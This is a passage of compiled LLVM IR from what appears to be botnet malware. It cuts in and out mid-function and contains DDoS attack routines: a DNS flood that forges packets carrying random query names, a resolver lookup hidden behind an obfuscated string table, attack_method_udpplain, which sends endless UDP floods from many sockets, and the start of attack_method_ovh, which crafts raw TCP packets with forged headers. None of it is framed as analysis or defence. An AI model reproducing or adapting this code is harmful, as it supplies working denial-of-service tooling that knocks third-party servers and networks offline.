  %wide.trip.count = zext i32 %29 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %49 = icmp eq i32 %29, 1
  br label %64

; <label>:50:                                     ; preds = %32
  %51 = call i32 @close(i32 %30) #10
  br label %179

.preheader.loopexit:                              ; preds = %._crit_edge
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader122..preheader_crit_edge
  %.pre-phi134 = phi i64 [ %.pre133, %.preheader122..preheader_crit_edge ], [ %39, %.preheader.loopexit ]
  %52 = and i32 %11, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %17, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = and i32 %19, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = and i32 %21, 65535
  %59 = icmp eq i32 %58, 65535
  %60 = add nuw nsw i32 %.pre, 27
  %61 = add i32 %60, %29
  %addconv132 = add nuw nsw i32 %.pre, 47
  %62 = zext i32 %addconv132 to i64
  %63 = add nsw i64 %62, %.pre-phi134
  br label %.loopexit

; <label>:64:                                     ; preds = %.lr.ph130, %._crit_edge
  %65 = phi i32 [ 0, %.lr.ph130 ], [ %133, %._crit_edge ]
  %66 = call noalias i8* @calloc(i64 600, i64 1) #10
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8*, i8** %8, i64 %67
  store i8* %66, i8** %68, align 8
  %69 = getelementptr inbounds i8, i8* %66, i64 20
  %70 = getelementptr inbounds i8, i8* %66, i64 28
  %71 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %72 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %72, align 1
  %73 = call zeroext i16 @htons(i16 zeroext %42) #11
  %74 = getelementptr inbounds i8, i8* %66, i64 2
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 2
  %76 = call zeroext i16 @htons(i16 zeroext %12) #11
  %77 = getelementptr inbounds i8, i8* %66, i64 4
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 4
  %79 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %79, align 4
  br i1 %43, label %84, label %80

; <label>:80:                                     ; preds = %64
  %81 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %82 = getelementptr inbounds i8, i8* %66, i64 6
  %83 = bitcast i8* %82 to i16*
  store i16 %81, i16* %83, align 2
  br label %84

; <label>:84:                                     ; preds = %64, %80
  %85 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 17, i8* %85, align 1
  %86 = load i32, i32* @LOCAL_ADDR, align 4
  %87 = getelementptr inbounds i8, i8* %66, i64 12
  %88 = bitcast i8* %87 to i32*
  store i32 %86, i32* %88, align 4
  %89 = getelementptr inbounds i8, i8* %66, i64 16
  %90 = bitcast i8* %89 to i32*
  store i32 %26, i32* %90, align 4
  %91 = call zeroext i16 @htons(i16 zeroext %18) #11
  %92 = bitcast i8* %69 to i16*
  store i16 %91, i16* %92, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %20) #11
  %94 = getelementptr inbounds i8, i8* %66, i64 22
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  %96 = call zeroext i16 @htons(i16 zeroext %46) #11
  %97 = getelementptr inbounds i8, i8* %66, i64 24
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %22) #11
  %100 = bitcast i8* %70 to i16*
  store i16 %99, i16* %100, align 2
  %101 = call zeroext i16 @htons(i16 zeroext 256) #11
  %102 = getelementptr inbounds i8, i8* %66, i64 30
  %103 = bitcast i8* %102 to i16*
  store i16 %101, i16* %103, align 2
  %104 = call zeroext i16 @htons(i16 zeroext 1) #11
  %105 = getelementptr inbounds i8, i8* %66, i64 32
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 %24, i8* %71, align 1
  %108 = getelementptr inbounds i8, i8* %107, i64 %38
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  call void @util_memcpy(i8* %109, i8* nonnull %25, i32 %47) #10
  br i1 %48, label %.lr.ph128.preheader, label %._crit_edge

.lr.ph128.preheader:                              ; preds = %84
  br i1 %lcmp.mod, label %.lr.ph128.prol.loopexit.unr-lcssa, label %.lr.ph128.prol.preheader

.lr.ph128.prol.preheader:                         ; preds = %.lr.ph128.preheader
  br label %.lr.ph128.prol

.lr.ph128.prol:                                   ; preds = %.lr.ph128.prol.preheader
  %110 = load i8, i8* %25, align 1
  %111 = icmp eq i8 %110, 46
  br i1 %111, label %113, label %112

; <label>:112:                                    ; preds = %.lr.ph128.prol
  br label %115

; <label>:113:                                    ; preds = %.lr.ph128.prol
  store i8 0, i8* %108, align 1
  %114 = getelementptr inbounds i8, i8* %108, i64 1
  br label %115

; <label>:115:                                    ; preds = %113, %112
  %.1119.prol = phi i8* [ %114, %113 ], [ %108, %112 ]
  %.1.prol = phi i8 [ 0, %113 ], [ 1, %112 ]
  br label %.lr.ph128.prol.loopexit.unr-lcssa

.lr.ph128.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph128.preheader, %115
  %.1119.lcssa.unr.ph = phi i8* [ %.1119.prol, %115 ], [ undef, %.lr.ph128.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %115 ], [ undef, %.lr.ph128.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %115 ], [ 0, %.lr.ph128.preheader ]
  %.0115126.unr.ph = phi i8 [ %.1.prol, %115 ], [ 0, %.lr.ph128.preheader ]
  %.0118124.unr.ph = phi i8* [ %.1119.prol, %115 ], [ %108, %.lr.ph128.preheader ]
  br label %.lr.ph128.prol.loopexit

.lr.ph128.prol.loopexit:                          ; preds = %.lr.ph128.prol.loopexit.unr-lcssa
  br i1 %49, label %._crit_edge.loopexit, label %.lr.ph128.preheader.new

.lr.ph128.preheader.new:                          ; preds = %.lr.ph128.prol.loopexit
  br label %.lr.ph128

.lr.ph128:                                        ; preds = %185, %.lr.ph128.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph128.preheader.new ], [ %indvars.iv.next.1, %185 ]
  %.0115126 = phi i8 [ %.0115126.unr.ph, %.lr.ph128.preheader.new ], [ %.1.1, %185 ]
  %.0118124 = phi i8* [ %.0118124.unr.ph, %.lr.ph128.preheader.new ], [ %.1119.1, %185 ]
  %116 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv
  %117 = load i8, i8* %116, align 1
  %118 = icmp eq i8 %117, 46
  br i1 %118, label %119, label %122

; <label>:119:                                    ; preds = %.lr.ph128
  store i8 %.0115126, i8* %.0118124, align 1
  %120 = getelementptr inbounds i8, i8* %108, i64 %indvars.iv
  %121 = getelementptr inbounds i8, i8* %120, i64 1
  br label %.lr.ph128.1135

; <label>:122:                                    ; preds = %.lr.ph128
  %123 = add i8 %.0115126, 1
  br label %.lr.ph128.1135

.lr.ph128.1135:                                   ; preds = %119, %122
  %.1119 = phi i8* [ %121, %119 ], [ %.0118124, %122 ]
  %.1 = phi i8 [ 0, %119 ], [ %123, %122 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %124 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv.next
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 46
  br i1 %126, label %182, label %180

._crit_edge.loopexit.unr-lcssa:                   ; preds = %185
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph128.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1119.lcssa = phi i8* [ %.1119.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1119.1, %._crit_edge.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %84
  %.0118.lcssa = phi i8* [ %108, %84 ], [ %.1119.lcssa, %._crit_edge.loopexit ]
  %.0115.lcssa = phi i8 [ 0, %84 ], [ %.1.lcssa, %._crit_edge.loopexit ]
  store i8 %.0115.lcssa, i8* %.0118.lcssa, align 1
  %127 = getelementptr inbounds i8, i8* %108, i64 %39
  %128 = getelementptr inbounds i8, i8* %127, i64 2
  %129 = bitcast i8* %128 to i16*
  store i16 %104, i16* %129, align 2
  %130 = getelementptr inbounds i8, i8* %128, i64 2
  %131 = bitcast i8* %130 to i16*
  store i16 %104, i16* %131, align 2
  %132 = load i32, i32* %5, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %5, align 4
  %134 = icmp slt i32 %133, %36
  br i1 %134, label %64, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %155
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %37, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %155
  %storemerge120123 = phi i32 [ %177, %155 ], [ 0, %.lr.ph.preheader ]
  %135 = sext i32 %storemerge120123 to i64
  %136 = getelementptr inbounds i8*, i8** %8, i64 %135
  %137 = load i8*, i8** %136, align 8
  %138 = bitcast i8* %137 to %struct.iphdr*
  %139 = getelementptr inbounds i8, i8* %137, i64 20
  %140 = getelementptr inbounds i8, i8* %137, i64 28
  %141 = getelementptr inbounds i8, i8* %137, i64 41
  br i1 %53, label %142, label %145

; <label>:142:                                    ; preds = %.lr.ph
  %143 = getelementptr inbounds i8, i8* %137, i64 4
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %142, %.lr.ph
  br i1 %55, label %146, label %148

; <label>:146:                                    ; preds = %145
  %147 = bitcast i8* %139 to i16*
  store i16 0, i16* %147, align 2
  br label %148

; <label>:148:                                    ; preds = %146, %145
  br i1 %57, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %137, i64 22
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 2
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %59, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %140 to i16*
  store i16 0, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %153, %152
  call void @rand_alpha_str(i8* %141, i32 %.pre)
  %156 = getelementptr inbounds i8, i8* %137, i64 10
  %157 = bitcast i8* %156 to i16*
  store i16 0, i16* %157, align 2
  %158 = bitcast i8* %137 to i16*
  %159 = call zeroext i16 @checksum_generic(i16* %158, i32 20)
  store i16 %159, i16* %157, align 2
  %160 = getelementptr inbounds i8, i8* %137, i64 26
  %161 = bitcast i8* %160 to i16*
  store i16 0, i16* %161, align 2
  %162 = getelementptr inbounds i8, i8* %137, i64 24
  %163 = bitcast i8* %162 to i16*
  %164 = load i16, i16* %163, align 2
  %165 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %138, i8* %139, i16 zeroext %164, i32 %61)
  store i16 %165, i16* %161, align 2
  %166 = load i32, i32* %5, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 0, i32 2, i32 0
  store i32 %26, i32* %168, align 4
  %169 = getelementptr inbounds i8, i8* %137, i64 22
  %170 = bitcast i8* %169 to i16*
  %171 = load i16, i16* %170, align 2
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 0, i32 1
  store i16 %171, i16* %172, align 2
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 0
  %174 = bitcast %struct.sockaddr_in* %173 to %struct.sockaddr*
  %175 = call i64 @sendto(i32 %30, i8* %137, i64 %63, i32 16384, %struct.sockaddr* %174, i32 16) #10
  %176 = load i32, i32* %5, align 4
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %5, align 4
  %178 = icmp slt i32 %177, %36
  br i1 %178, label %.lr.ph, label %.loopexit.loopexit

; <label>:179:                                    ; preds = %28, %4, %50
  ret void

; <label>:180:                                    ; preds = %.lr.ph128.1135
  %181 = add i8 %.1, 1
  br label %185

; <label>:182:                                    ; preds = %.lr.ph128.1135
  store i8 %.1, i8* %.1119, align 1
  %183 = getelementptr inbounds i8, i8* %108, i64 %indvars.iv.next
  %184 = getelementptr inbounds i8, i8* %183, i64 1
  br label %185

; <label>:185:                                    ; preds = %182, %180
  %.1119.1 = phi i8* [ %184, %182 ], [ %.1119, %180 ]
  %.1.1 = phi i8 [ 0, %182 ], [ %181, %180 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph128
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 21)
  %3 = tail call i8* @table_retrieve_val(i32 21, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #10
  tail call void @table_lock_val(i8 zeroext 21)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #10
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #10
  tail call void @table_unlock_val(i8 zeroext 22)
  %11 = tail call i8* @table_retrieve_val(i32 22, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #10
  call void @table_lock_val(i8 zeroext 22)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %16 = ashr exact i64 %sext, 32
  br label %17

; <label>:17:                                     ; preds = %.lr.ph, %35
  %indvars.iv = phi i64 [ %15, %.lr.ph ], [ %indvars.iv.next, %35 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %35 ]
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %.02633, 0
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17
  switch i8 %19, label %22 [
    i8 32, label %35
    i8 9, label %35
  ]

; <label>:22:                                     ; preds = %21, %17
  %.1 = phi i8 [ %.02633, %17 ], [ 1, %21 ]
  %23 = icmp eq i8 %19, 46
  %24 = trunc i64 %indvars.iv to i32
  br i1 %23, label %28, label %25

; <label>:25:                                     ; preds = %22
  %.off = add i8 %19, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = icmp eq i32 %24, %.old
  %or.cond29 = or i1 %27, %26
  br i1 %or.cond29, label %.critedge, label %35

; <label>:28:                                     ; preds = %22
  %.old28 = icmp eq i32 %24, %.old
  br i1 %.old28, label %.critedge, label %35

.critedge:                                        ; preds = %28, %25
  %.02731.lcssa = phi i32 [ %.old, %28 ], [ %24, %25 ]
  %29 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %15
  %31 = sub nsw i32 %.02731.lcssa, %12
  call void @util_memcpy(i8* nonnull %29, i8* %30, i32 %31) #10
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %32
  store i8 0, i8* %33, align 1
  %34 = call i32 @inet_addr(i8* nonnull %29) #10
  br label %38

; <label>:35:                                     ; preds = %25, %21, %21, %28
  %.2 = phi i8 [ %.1, %28 ], [ 0, %21 ], [ 0, %21 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %36 = icmp slt i64 %indvars.iv.next, %16
  br i1 %36, label %17, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %35
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %37 = call i32 @htonl(i32 134744072) #11
  br label %38

; <label>:38:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %34, %.critedge ], [ %37, %.loopexit ]
  ret i32 %.0
}

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %58
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp eq i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %58
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %58 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #11
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = call i32 @bind(i32 %43, %struct.sockaddr* nonnull %31, i32 16) #10
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %50 = load i8, i8* %49, align 4
  %51 = icmp ult i8 %50, 32
  br i1 %51, label %52, label %58

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @ntohl(i32 %54) #11
  %56 = call i32 @htonl(i32 %55) #11
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %56, i32* %57, align 4
  br label %58

; <label>:58:                                     ; preds = %52, %47
  %59 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %60 = call i32 @connect(i32 %43, %struct.sockaddr* %59, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %61 = icmp slt i64 %indvars.iv.next, %32
  br i1 %61, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  %62 = icmp eq i8 %16, 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %67, %.lr.ph.preheader
  %.160 = phi i32 [ %.mux, %67 ], [ 0, %.lr.ph.preheader ]
  %63 = sext i32 %.160 to i64
  %64 = getelementptr inbounds i8*, i8** %8, i64 %63
  %65 = load i8*, i8** %64, align 8
  br i1 %62, label %67, label %66

; <label>:66:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %65, i32 %.mask)
  br label %67

; <label>:67:                                     ; preds = %.lr.ph, %66
  %68 = getelementptr inbounds i32, i32* %10, i64 %63
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %65, i64 %34, i32 16384) #10
  %71 = add nsw i32 %.160, 1
  %72 = icmp slt i32 %71, %24
  %.mux = select i1 %72, i32 %71, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_ovh(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %190, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = zext i8 %0 to i64
  %65 = or i16 %63, 160
  br label %79

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %190

..preheader_crit_edge:                            ; preds = %96
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i32 %36, -1
  %70 = and i32 %11, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %17, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %19, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = icmp eq i32 %21, 65535
  %77 = icmp eq i32 %22, 65535
  %78 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:79:                                     ; preds = %.lr.ph130, %96
  %indvars.iv = phi i64 [ 0, %.lr.ph130 ], [ %indvars.iv.next, %96 ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %80, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 20
  %83 = getelementptr inbounds i8, i8* %80, i64 40
  store i8 69, i8* %80, align 4
  %84 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #11
  %86 = getelementptr inbounds i8, i8* %80, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #11
  %89 = getelementptr inbounds i8, i8* %80, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %79
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %94 = getelementptr inbounds i8, i8* %80, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %79, %92
  %97 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %80, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %80, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #11
  %105 = bitcast i8* %82 to i16*
  store i16 %104, i16* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %20) #11
  %107 = getelementptr inbounds i8, i8* %80, i64 22
  %108 = bitcast i8* %107 to i16*
